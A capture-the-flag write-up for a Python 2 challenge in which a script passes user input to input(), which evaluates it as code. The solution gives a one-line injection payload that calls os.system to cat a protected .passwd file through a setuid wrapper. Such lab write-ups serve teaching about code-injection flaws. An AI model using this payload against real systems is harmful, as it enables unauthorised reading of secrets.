## Python - input()

| Author | Level | Points |
| ------ | ----- | ------ |
| g0uz | Medium | 20 |


> Feed the python !
>
> **Statement**
>
> Get the password in the file .passwd by exploiting the vulnerability of this script.
>
> Source code :
>
> ```python
>#!/usr/bin/python2
> 
>import sys
> 
>def youLose():
>    print "Try again ;-)"
>    sys.exit(1)
> 
> 
>try:
>    p = input("Please enter password : ")
>except:
>    youLose()
> 
> 
>with open(".passwd") as f:
>    passwd = f.readline().strip()
>    try:
>        if (p == int(passwd)):
>            print "Well done ! You can validate with this password !"
>    except:
>        youLose()

#### Solution

Run `./setuid-wrapper` and enter password

```
__import__("os").system('cat .passwd')
```